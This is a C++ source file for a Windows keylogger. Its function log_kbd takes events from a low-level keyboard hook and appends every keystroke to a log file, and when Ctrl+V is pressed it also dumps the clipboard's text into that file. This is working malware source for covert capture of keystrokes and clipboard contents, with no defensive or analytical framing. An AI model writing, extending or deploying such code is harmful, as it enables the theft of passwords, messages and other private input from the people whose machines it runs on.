#include "keylogger.h"
#include "keyboard.h"
#include "constants.h"
#include <cstdint>

namespace keylogger 
{
void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
{
	std::wofstream out_file{ constants::out_file, std::ofstream::app };

	if (constants::key_codes.find(kbd_hook->vkCode) != constants::key_codes.cend())
	{
		out_file << constants::key_codes.at(kbd_hook->vkCode);
	}
	else if (keyboard::is_control_down())
	{
		if (kbd_hook->vkCode == constants::virtual_key_v) 
		{
			write_clipboard_data(out_file);
		}
		else
		{
			out_file << L"[CTRL + " << static_cast<wchar_t>(kbd_hook->vkCode) << L"]";
		}
	}
	else
	{
		BYTE state[constants::keyboard_state_size];
		keyboard::get_state(state);

		WCHAR key_buffer[constants::key_buffer_size];
		const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, constants::key_buffer_size, 0);

		if (result > 0) out_file << key_buffer;
	}
}

	void write_clipboard_data(std::wofstream& stream)
	{
		if (OpenClipboard(nullptr))
		{
			auto handle = GetClipboardData(CF_UNICODETEXT);

			if (handle != nullptr)
			{
				const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));

				if (buffer != nullptr) stream << buffer;

				GlobalUnlock(handle);
			}

			CloseClipboard();
		}
	}
}
